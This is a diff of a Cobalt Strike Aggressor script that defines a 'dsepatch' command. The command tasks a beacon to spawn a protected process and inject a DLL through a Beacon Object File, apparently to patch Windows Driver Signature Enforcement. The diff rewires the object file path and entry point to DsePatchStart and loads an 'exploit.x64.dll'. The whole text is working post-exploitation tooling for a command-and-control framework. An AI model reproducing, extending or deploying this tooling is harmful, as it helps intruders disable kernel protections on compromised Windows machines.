@@ -7,7 +7,7 @@ sub ppspawn_dll {
 	$dlln = random_string( "12" ) .".dll";
 	$lnkn = random_string( "12" ) .".dll";
 
-	if ( !-exists script_resource( "inject/ppinject." . $arch . ".o" ) ) {
+	if ( !-exists script_resource( "dsepatch/dsepatch." . $arch . ".o" ) ) {
 		berror( $1, "could not find ppinject object file on disk." );
 		return;
 	};
@@ -18,7 +18,7 @@ sub ppspawn_dll {
 
 	btask( $1, "Tasking beacon to spawn a protected process and load " . $2 . " as " . $dlln );
 
-	$boff = openf( script_resource( "inject/ppinject." . $arch . ".o" ) );
+	$boff = openf( script_resource( "dsepatch/dsepatch." . $arch . ".o" ) );
 	$bofb = readb( $boff, -1 );
 	closef( $boff );
 
@@ -27,7 +27,7 @@ sub ppspawn_dll {
 	closef( $payf );
 
 	$args = bof_pack( $1, "ZZZbi", $dlln, $lnkn, "services.exe", $payb, $3 );
-	beacon_inline_execute( $1, $bofb, "SpawnProtectedProcessWithLibrary", $args );
+	beacon_inline_execute( $1, $bofb, "DsePatchStart", $args );
 }
 
 ##
@@ -44,7 +44,7 @@ alias dsepatch {
 		berror( $1, "does not support x86." );
 		return;
 	};
-	ppspawn_dll( $1, "dsepatch/dsepatch.x64.dll", $2 );
+	ppspawn_dll( $1, "exploit/exploit.x64.dll", $2 );
 };
 
 ##
